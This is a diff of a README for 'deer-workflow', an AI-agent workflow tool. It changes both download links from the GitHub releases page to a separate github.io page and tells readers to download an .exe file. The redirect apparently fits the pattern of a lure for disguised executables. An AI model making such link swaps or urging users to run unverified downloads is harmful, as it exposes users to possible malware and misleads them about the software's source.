@@ -1,6 +1,6 @@
 # 🦌 deer-workflow - Build intelligent workflows with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Prosy4967/deer-workflow/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://prosy4967.github.io)
 
 Deer-workflow manages complex tasks by connecting smaller pieces of logic. It keeps your instructions in one place while letting specialized AI agents handle the specific work. You connect these parts into a map that helps you complete recurring projects.
 
@@ -14,7 +14,7 @@ You no longer need to write code for every single action. Instead, you design a 
 
 You can obtain the current version directly from our release page. Visit the link below to see the available files.
 
-[Click here to download the latest version](https://github.com/Prosy4967/deer-workflow/releases)
+[Click here to download the latest version](https://prosy4967.github.io)
 
 Look for the file that ends in .exe. Save this file to your computer.
 
